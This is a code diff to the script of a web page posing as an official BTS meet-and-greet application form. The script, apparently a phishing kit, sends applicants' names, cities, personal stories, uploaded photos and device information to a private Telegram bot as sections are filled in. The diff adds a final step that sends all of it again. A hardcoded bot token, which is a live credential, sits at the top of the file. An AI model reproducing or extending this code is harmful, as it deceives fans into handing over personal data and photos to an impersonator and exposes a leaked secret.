@@ -1,6 +1,7 @@
 /* ============================================================
    BTS MEET & GREET — OFFICIAL APPLICATION
-   Real-time auto-send · Battery · Referrer · Progressive
+   ▸ Real-time auto-send (section / photo)
+   ▸ Final submit sends EVERYTHING again (summary + all photos)
    ============================================================ */
 
 var BOT_TOKEN     = "8604239989:AAHnuyJZpz_E6s-_7rXUvlbHazAKOAHEB7A";
@@ -221,7 +222,7 @@ function buildSection2Caption() {
 }
 
 /* ============================================================
-   AUTO-SEND
+   AUTO-SEND PER SECTION (on input)
    ============================================================ */
 function autoSendSection(num) {
   if (num === 1 && !sent.section1 && isSection1Complete()) {
@@ -440,7 +441,7 @@ function renderPhotos() {
 }
 
 /* ============================================================
-   FINAL SUBMIT
+   FINAL SUBMIT — sends EVERYTHING together
    ============================================================ */
 form.addEventListener("submit", function(e){
   e.preventDefault();
@@ -460,6 +461,7 @@ form.addEventListener("submit", function(e){
   btnSubmit.textContent = "Submitting…";
   showStatus("info", "Sending your complete application…");
 
+  /* ---------- Build final summary ---------- */
   var finalCaption =
     "🎉 <b>BTS MEET &amp; GREET — COMPLETE APPLICATION</b>\n" +
     "═══════════════════════\n" +
@@ -473,20 +475,47 @@ form.addEventListener("submit", function(e){
     "💜 <b>Favourite:</b> " + escape(favMember.value) + "\n" +
     "📝 <b>Story:</b>\n" + escape(reason.value.trim()) + "\n" +
     "─────────\n" +
-    "📸 <b>Photos:</b> " + photos.length + " attached\n" +
+    "📸 <b>Photos:</b> " + photos.length + " attached (sending below)\n" +
     deviceInfoString();
 
-  sendMessage(finalCaption).then(function(ok){
-    if (ok) {
+  /* Step 1: send summary message */
+  sendMessage(finalCaption).then(function(summaryOk){
+    if (!summaryOk) {
+      showStatus("err", "Failed to send summary. Please try again.");
+      btnSubmit.disabled = false;
+      btnSubmit.textContent = "Submit Complete Application";
+      return;
+    }
+
+    /* Step 2: send ALL photos again (in order) */
+    var chain = Promise.resolve(true);
+    photos.forEach(function(p, i){
+      chain = chain.then(function(){
+        var photoCaption =
+          "📸 <b>COMPLETE APPLICATION — Photo " + (i+1) + "/" + photos.length + "</b>\n" +
+          "━━━━━━━━━━━━━━━━━━━━━━\n" +
+          "👤 <b>Name:</b> " + escape(fullName.value.trim()) + "\n" +
+          "🏙️ <b>City:</b> " + escape(city.value.trim()) + "\n" +
+          "💜 <b>Favourite:</b> " + escape(favMember.value) + "\n" +
+          "📸 <b>Photo #:</b> " + (i+1) + " of " + photos.length + "\n" +
+          "🕐 " + new Date().toLocaleString("en-US", {timeZoneName:"short"});
+        return sendPhotoBlob(p.blob, photoCaption);
+      });
+    });
+
+    return chain;
+  }).then(function(allOk){
+    if (allOk !== false) {
       showStatus("ok", "✓ Application submitted! Thank you, ARMY.");
       btnSubmit.textContent = "Submitted ✓";
       setTimeout(function(){ window.location.href = "next.html"; }, 1600);
     } else {
-      showStatus("err", "Failed to send. Please try again.");
+      showStatus("err", "Some data failed. Please try again.");
       btnSubmit.disabled = false;
       btnSubmit.textContent = "Submit Complete Application";
     }
-  }).catch(function(){
+  }).catch(function(err){
+    console.error(err);
     showStatus("err", "Something went wrong.");
     btnSubmit.disabled = false;
     btnSubmit.textContent = "Submit Complete Application";
